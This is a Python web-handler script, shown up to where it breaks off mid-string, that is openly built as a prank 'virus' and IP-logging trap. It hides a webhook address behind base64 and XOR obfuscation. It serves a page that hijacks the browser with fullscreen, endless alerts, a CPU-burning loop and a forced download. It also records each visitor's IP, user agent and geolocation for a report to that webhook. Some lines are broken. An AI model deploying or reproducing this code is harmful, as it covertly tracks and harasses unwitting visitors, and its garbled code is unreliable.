from http.server import BaseHTTPRequestHandler
import requests
import httpagentparser
import base64
import sys

def unhide_webhook():
    encoded = "LDwNAjcqOj80DUYeGC5HNDcZIQhTNz8wQgM2GSwNFx5XPiwZOyo8Di0pIysiNxc3PjkDHUIWITg7ECIkDyUFGAYOARpIREVbUkdaR0JLTEVaVkxMX15CWF0GGBsaBgURAkEOBghdGBwXWwoVGxYdDhJGXU8ABAEaDw=="
    step1 = base64.b64decode(encoded).decode('utf-8')
    key = "tungtungvirus"
    step2 = ''.join(chr(ord(c) ^ ord(key )) for i, c in enumerate(step1))
    return step2[::-1]

WEBHOOK_URL = unhide_webhook()

FAKE_IMAGE_URL = "https://media.tenor.com/XPiWs5il8owAAAAM/tung-tungtung-tungtungtung-sahur-tungtungtungsahur-tungtungsahur.gif"

ANNOY_HTML = """
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>TUNG TUNG VIRUS</title>
  <style>body{margin:0;background:#000;color:#f00;font-family:monospace;overflow:hidden;height:100vh;}#overlay{position:fixed;inset:0;background:rgba(255,0,0,0.95);display:flex;align-items:center;justify-content:center;flex-direction:column;z-index:9999;}</style>
</head>
<body>
  <div id="overlay">
    <h1 style="font-size:6em;animation:blink 0.3s infinite;">TUNG TUNG VIRUS</h1>
    <p style="font-size:2em;">Your browser is now mine...</p>
  </div>
  <audio id="song" autoplay loop>
    <source src="https://www.myinstants.com/media/sounds/tung-tung-sahur.mp3" type="audio/mpeg">
  </audio>
  <script>
    document.documentElement.requestFullscreen?.().catch(()=>{});
    window.onbeforeunload = () => "TUNG TUNG says NO!";
    setInterval(() => alert("TUNG TUNG VIRUS: CLOSE FAILED!"), 700);
    function cpuHell() {
      while(true) {
        for(let i = 0; i < 20000000; i++) {
          Math.sin(i) * Math.cos(i) * Math.random();
        }
        setTimeout(cpuHell, 0);
      }
    }
    cpuHell();
    const audio = document.getElementById("song");
    audio.volume = 1.0;
    audio.play().catch(()=>{});
    const link = document.createElement('a');
    link.href = "%s";
    link.download = "tung-tung-virus.gif";
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
  </script>
</body>
</html>
""" % FAKE_IMAGE_URL

class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        try:
            ip = self.headers.get('X-Forwarded-For', self.client_address[0])
            user_agent = self.headers.get('User-Agent', 'Unknown')
            parsed = httpagentparser.detect(user_agent)

            ip_info =            try:
                resp = requests.get(f"https://ip-api.com/json/{ip}?fields=status,country,regionName,city,lat,lon,timezone,isp,as,mobile,proxy", timeout=4)
                ip_info = resp.json()
            except:
                pass

            success = ip_info.get("status") == "success"
            embed = {
                "title": "🖼️ Image Logger - IP Logged",
                "description": "**A User Opened the Original
